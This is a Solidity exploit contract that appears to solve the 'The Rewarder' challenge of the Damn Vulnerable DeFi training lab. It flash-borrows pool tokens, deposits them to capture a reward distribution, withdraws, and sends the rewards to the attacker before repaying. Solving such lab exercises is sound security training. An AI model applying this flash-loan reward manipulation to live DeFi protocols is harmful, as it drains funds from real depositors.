//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract GimmeThat {
    FlashLoanerPool public flPool;
    TheRewarderPool public trPool;
    DamnValuableToken public liquid;
    RewardToken public reward;

    constructor(
        address _flPool,
        address _trPool,
        address _liquid,
        address _reward
    ) {
        flPool = FlashLoanerPool(_flPool);
        trPool = TheRewarderPool(_trPool);
        liquid = DamnValuableToken(_liquid);
        reward = RewardToken(_reward);
    }

    function getThat() public {
        console.log("flBalance:", liquid.balanceOf(address(flPool)));
        flPool.flashLoan(liquid.balanceOf(address(flPool)));
    }

    // FlashLoanerPool calls this function
    function receiveFlashLoan(uint256 num) public {
        // approve for deposit
        liquid.approve(address(trPool), num);
        // deposit into RewarderPool
        trPool.deposit(liquid.balanceOf(address(this)));
        // rewarder.distributeRewards()
        uint rewards = trPool.distributeRewards();
        console.log("rewards:", rewards);
        // rewarder.withdraw()
        trPool.withdraw(num);
        // transfer rewards to attacker
        console.log("bal:", reward.balanceOf(address(this)));
        reward.transfer(tx.origin, reward.balanceOf(address(this)));
        // repay flashLoan
        liquid.transfer(address(flPool), num);
        // money money winner winner vegan chicken dinner! :) You're doing a great job by the way! i love you
    }
}
